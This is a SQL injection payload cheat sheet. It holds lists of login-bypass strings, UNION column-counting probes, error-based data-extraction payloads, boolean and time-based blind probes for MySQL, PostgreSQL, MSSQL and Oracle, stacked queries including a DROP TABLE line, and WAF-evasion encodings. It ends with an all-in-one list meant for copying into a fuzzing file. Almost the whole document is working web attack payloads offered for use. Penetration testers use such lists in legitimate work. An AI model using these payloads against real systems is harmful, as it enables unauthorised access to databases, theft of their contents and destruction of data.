# SQL INJECTION PAYLOADS COMPLETE CHEAT SHEET

## 1. BASIC AUTHENTICATION BYPASS PAYLOADS
Classic payloads to test login forms, numeric IDs, or any input that might be vulnerable.

```
'
''
`
`)
"))
'))
"
""
")
"))
""
"'))
" OR "1"="1
" OR 1=1
" OR 1=1--
" OR 1=1#
" OR 1=1/*
" OR 1=1-- -
" OR "1"="1"--
" OR "1"="1"#
" OR "1"="1"/*
" OR "1"="1"-- -
' OR '1'='1
' OR 1=1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
' OR 1=1-- -
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
' OR '1'='1'-- -
) OR (1=1
) OR (1=1)--
) OR ('1'='1
) OR ('1'='1')--
') OR ('1'='1
') OR ('1'='1')--
')) OR (('1'='1
')) OR (('1'='1'))--
' OR 1=1 AND '1'='1
' OR 1=1 AND '1'='1'--
' OR 1=1 AND '1'='1'#
' AND 1=1
' AND 1=2
' OR TRUE--
' OR FALSE--
' OR 1=1 LIMIT 1--
' OR 1=1 ORDER BY 1--
1 OR 1=1
1' OR '1'='1
1' OR 1=1--
1 OR 1=1--
1' OR '1'='1'--
1" OR "1"="1
1" OR 1=1--
1) OR (1=1
2) OR (1=1)--
1') OR ('1'='1
1') OR ('1'='1')--
```

---

## 2. UNION-BASED SQL INJECTION (COLUMN COUNTING)
Use `ORDER BY` to find the number of columns, then `UNION SELECT NULL` to test if the injection point is vulnerable and how many columns are returned.

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
' ORDER BY 5--
' ORDER BY 10--
' ORDER BY 100--
1 ORDER BY 1--
1 ORDER BY 2--
1 ORDER BY 3--
1 ORDER BY 4--
1 ORDER BY 5--
1 ORDER BY 10--
1 ORDER BY 100--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
1 UNION SELECT NULL--
1 UNION SELECT NULL,NULL--
1 UNION SELECT NULL,NULL,NULL--
1 UNION SELECT NULL,NULL,NULL,NULL--
1 UNION SELECT NULL,NULL,NULL,NULL,NULL--
1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
```

---

## 3. ERROR-BASED SQL INJECTION
These payloads trigger explicit database errors that may reveal information about the database structure, version, or user. Useful for quick confirmation.

```
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,user()),1)--
' AND GTID_SUBSET(CONCAT(0x7e,database(),0x7e),1)--
' AND 1=convert(int, @@version)--
' AND 1=CAST(db_name() AS int)--
' AND 1=ctxsys.drithsx.sn(1,500)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
' AND 1=convert(int,(SELECT @@version))--
' AND 1=CAST((SELECT db_name()) AS int)--
```

---

## 4. BOOLEAN-BASED BLIND SQL INJECTION
These payloads return different results (true/false) to test for blind SQLi. Compare responses for true vs false conditions.

```
' AND 1=1--
' AND 1=2--
' AND '1'='1
' AND '1'='2
' OR 1=1--
' OR 1=2--
' AND 1=1#
' AND 1=2#
' AND '1'='1'--
' AND '1'='2'--
1 AND 1=1--
1 AND 1=2--
1 AND '1'='1
1 AND '1'='2
1 OR 1=1--
1 OR 1=2--
```

---

## 5. TIME-BASED BLIND SQL INJECTION
These payloads introduce a delay if the injection is successful. Use a delay of 5 seconds for clear detection.

**MySQL / MariaDB:**
```
' OR SLEEP(5)--
' OR SLEEP(5)#
' OR SLEEP(5)/*
' AND SLEEP(5)--
' AND SLEEP(5)#
' AND SLEEP(5)/*
1 OR SLEEP(5)--
1 OR SLEEP(5)#
1 AND SLEEP(5)--
1 AND SLEEP(5)#
' OR BENCHMARK(1000000,MD5('test'))--
' AND BENCHMARK(1000000,MD5('test'))--
```

**PostgreSQL:**
```
' OR pg_sleep(5)--
' AND pg_sleep(5)--
' OR pg_sleep(5)#
' AND pg_sleep(5)#
1 OR pg_sleep(5)--
1 AND pg_sleep(5)--
```

**Microsoft SQL Server (MSSQL):**
```
'; WAITFOR DELAY '00:00:05'--
'; WAITFOR DELAY '00:00:05'#
' OR WAITFOR DELAY '00:00:05'--
' OR WAITFOR DELAY '00:00:05'#
' AND WAITFOR DELAY '00:00:05'--
' AND WAITFOR DELAY '00:00:05'#
1; WAITFOR DELAY '00:00:05'--
1 OR WAITFOR DELAY '00:00:05'--
1 AND WAITFOR DELAY '00:00:05'--
```

**Oracle PL/SQL:**
```
' OR UTL_INADDR.get_host_address('non-existent-domain.com')--
' AND 1=ctxsys.drithsx.sn(1,500)--
```

---

## 6. STACKED QUERIES
Test if the database allows multiple queries separated by semicolons.

```
'; SELECT 1--
'; SELECT SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--
'; SELECT pg_sleep(5)--
'; SELECT 1; SELECT 2--
'; DROP TABLE test--
' ; SELECT 1--
' ; SELECT SLEEP(5)--
' ; WAITFOR DELAY '00:00:05'--
' ; SELECT pg_sleep(5)--
```

---

## 7. WAF BYPASS / OBFUSCATION TECHNIQUES
Use comments, encoding, case variation, and concatenation to bypass basic filters.

```
'||'1'=='1
' || '1'=='1
'||1=1--
' || 1=1--
'%20OR%201=1--
'%20OR%20'1'='1
'%20OR%201=1#
'%20OR%201=1/*
'%20UNION%20SELECT%20NULL--
'%20ORDER%20BY%201--
'/**/OR/**/1=1--
'/**/UNION/**/SELECT/**/NULL--
'/*!50000OR*/1=1--
'/*!50000UNION*/SELECT NULL--
' OR 1=1-- -
' OR '1'='1'-- -
' OR 1=1;--
' OR 1=1;#
' OR 1=1;/*
' OR 1=1 LIMIT 1;--
' OR 1=1 LIMIT 1;#
' OR 1=1 LIMIT 1;/*
' OR 1=1 OFFSET 0--
' OR 1=1 OFFSET 0#
' OR 1=1 OFFSET 0/*
' OR 1=1 UNION SELECT NULL--
' OR 1=1 UNION SELECT NULL,NULL--
' OR 1=1 UNION SELECT NULL,NULL,NULL--
' OR 1=1 UNION SELECT NULL,NULL,NULL,NULL--
' OR 1=1 UNION SELECT NULL,NULL,NULL,NULL,NULL--
```

---

## 8. CONTEXT-SPECIFIC PAYLOADS
Adapt to the injection context: string, numeric, parentheses, etc.

### String context (inside single quotes)
```
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--
```

### Numeric context (no quotes)
```
1 OR 1=1
1 OR 1=1--
1 UNION SELECT NULL--
```

### Parentheses context (closing parenthesis)
```
) OR (1=1
) OR (1=1)--
') OR ('1'='1
') OR ('1'='1')--
```

### Double quotes context
```
" OR "1"="1
" OR 1=1--
" UNION SELECT NULL--
```

---

## 9. DATABASE-SPECIFIC PAYLOADS (Detection Only)

### MySQL / MariaDB
```
' OR SLEEP(5)--
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,user()),1)--
' AND GTID_SUBSET(CONCAT(0x7e,database(),0x7e),1)--
```

### PostgreSQL
```
' OR pg_sleep(5)--
' AND 1=CAST(version() AS int)--
```

### Microsoft SQL Server
```
'; WAITFOR DELAY '00:00:05'--
' AND 1=convert(int, @@version)--
' AND 1=CAST(db_name() AS int)--
```

### Oracle
```
' OR UTL_INADDR.get_host_address('non-existent-domain.com')--
' AND 1=ctxsys.drithsx.sn(1,500)--
```

### SQLite
```
' OR 1=1--
' UNION SELECT NULL--
' AND 1=1--
```

---

## 10. TIPS FOR TESTING SQLI

1. Always start with a single quote `'` to see if it causes an error.
2. Use `ORDER BY` to find the number of columns before using `UNION SELECT`.
3. If `UNION` is blocked, try blind techniques: boolean or time-based.
4. For time-based, use a delay of 5 seconds to avoid false positives.
5. If quotes are filtered, try numeric contexts or encoded characters.
6. Use comments (`--`, `#`, `/* */`) to truncate the rest of the query.
7. For WAF bypass, try mixed case, inline comments, or URL encoding.
8. Always test both `AND` and `OR` operators.
9. Check for different database types by using specific functions (SLEEP, pg_sleep, WAITFOR).
10. Use error-based payloads to quickly confirm if errors are displayed.

---

## QUICK REFERENCE – SQL INJECTION CHARACTERS

| Character | URL Encoding | Purpose |
|-----------|--------------|---------|
| `'`       | `%27`        | String delimiter |
| `"`       | `%22`        | String delimiter |
| `)`       | `%29`        | Close parenthesis |
| `(`       | `%28`        | Open parenthesis |
| `--`      | `%2D%2D`     | Comment (SQL) |
| `#`       | `%23`        | Comment (MySQL) |
| `/*`      | `%2F%2A`     | Comment start |
| `*/`      | `%2A%2F`     | Comment end |
| `;`       | `%3B`        | Query separator |
| ` `       | `%20`        | Space |
| `=`       | `%3D`        | Equals |
| `AND`     | `%41%4E%44`  | Logical AND |
| `OR`      | `%4F%52`     | Logical OR |
| `UNION`   | `%55%4E%49%4F%4E` | Union operator |
| `SELECT`  | `%53%45%4C%45%43%54` | Select statement |

---

## ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
'
''
`
`)
"))
'))
"
""
")
"))
""
"'))
" OR "1"="1
" OR 1=1
" OR 1=1--
" OR 1=1#
" OR 1=1/*
" OR 1=1-- -
" OR "1"="1"--
" OR "1"="1"#
" OR "1"="1"/*
" OR "1"="1"-- -
' OR '1'='1
' OR 1=1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
' OR 1=1-- -
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
' OR '1'='1'-- -
) OR (1=1
) OR (1=1)--
) OR ('1'='1
) OR ('1'='1')--
') OR ('1'='1
') OR ('1'='1')--
')) OR (('1'='1
')) OR (('1'='1'))--
' OR 1=1 AND '1'='1
' OR 1=1 AND '1'='1'--
' OR 1=1 AND '1'='1'#
' AND 1=1
' AND 1=2
' OR TRUE--
' OR FALSE--
' OR 1=1 LIMIT 1--
' OR 1=1 ORDER BY 1--
1 OR 1=1
1' OR '1'='1
1' OR 1=1--
1 OR 1=1--
1' OR '1'='1'--
1" OR "1"="1
1" OR 1=1--
1) OR (1=1
2) OR (1=1)--
1') OR ('1'='1
1') OR ('1'='1')--
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
' ORDER BY 5--
' ORDER BY 10--
' ORDER BY 100--
1 ORDER BY 1--
1 ORDER BY 2--
1 ORDER BY 3--
1 ORDER BY 4--
1 ORDER BY 5--
1 ORDER BY 10--
1 ORDER BY 100--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
1 UNION SELECT NULL--
1 UNION SELECT NULL,NULL--
1 UNION SELECT NULL,NULL,NULL--
1 UNION SELECT NULL,NULL,NULL,NULL--
1 UNION SELECT NULL,NULL,NULL,NULL,NULL--
1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,user()),1)--
' AND GTID_SUBSET(CONCAT(0x7e,database(),0x7e),1)--
' AND 1=convert(int, @@version)--
' AND 1=CAST(db_name() AS int)--
' AND 1=ctxsys.drithsx.sn(1,500)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
' AND 1=convert(int,(SELECT @@version))--
' AND 1=CAST((SELECT db_name()) AS int)--
' AND 1=1--
' AND 1=2--
' AND '1'='1
' AND '1'='2
' OR 1=1--
' OR 1=2--
' AND 1=1#
' AND 1=2#
' AND '1'='1'--
' AND '1'='2'--
1 AND 1=1--
1 AND 1=2--
1 AND '1'='1
1 AND '1'='2
1 OR 1=1--
1 OR 1=2--
' OR SLEEP(5)--
' OR SLEEP(5)#
' OR SLEEP(5)/*
' AND SLEEP(5)--
' AND SLEEP(5)#
' AND SLEEP(5)/*
1 OR SLEEP(5)--
1 OR SLEEP(5)#
1 AND SLEEP(5)--
1 AND SLEEP(5)#
' OR BENCHMARK(1000000,MD5('test'))--
' AND BENCHMARK(1000000,MD5('test'))--
' OR pg_sleep(5)--
' AND pg_sleep(5)--
' OR pg_sleep(5)#
' AND pg_sleep(5)#
1 OR pg_sleep(5)--
1 AND pg_sleep(5)--
'; WAITFOR DELAY '00:00:05'--
'; WAITFOR DELAY '00:00:05'#
' OR WAITFOR DELAY '00:00:05'--
' OR WAITFOR DELAY '00:00:05'#
' AND WAITFOR DELAY '00:00:05'--
' AND WAITFOR DELAY '00:00:05'#
1; WAITFOR DELAY '00:00:05'--
1 OR WAITFOR DELAY '00:00:05'--
1 AND WAITFOR DELAY '00:00:05'--
' OR UTL_INADDR.get_host_address('non-existent-domain.com')--
' AND 1=ctxsys.drithsx.sn(1,500)--
'; SELECT 1--
'; SELECT SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--
'; SELECT pg_sleep(5)--
'; SELECT 1; SELECT 2--
'; DROP TABLE test--
' ; SELECT 1--
' ; SELECT SLEEP(5)--
' ; WAITFOR DELAY '00:00:05'--
' ; SELECT pg_sleep(5)--
'||'1'=='1
' || '1'=='1
'||1=1--
' || 1=1--
'%20OR%201=1--
'%20OR%20'1'='1
'%20OR%201=1#
'%20OR%201=1/*
'%20UNION%20SELECT%20NULL--
'%20ORDER%20BY%201--
'/**/OR/**/1=1--
'/**/UNION/**/SELECT/**/NULL--
'/*!50000OR*/1=1--
'/*!50000UNION*/SELECT NULL--
' OR 1=1-- -
' OR '1'='1'-- -
' OR 1=1;--
' OR 1=1;#
' OR 1=1;/*
' OR 1=1 LIMIT 1;--
' OR 1=1 LIMIT 1;#
' OR 1=1 LIMIT 1;/*
' OR 1=1 OFFSET 0--
' OR 1=1 OFFSET 0#
' OR 1=1 OFFSET 0/*
' OR 1=1 UNION SELECT NULL--
' OR 1=1 UNION SELECT NULL,NULL--
' OR 1=1 UNION SELECT NULL,NULL,NULL--
' OR 1=1 UNION SELECT NULL,NULL,NULL,NULL--
' OR 1=1 UNION SELECT NULL,NULL,NULL,NULL,NULL--
```
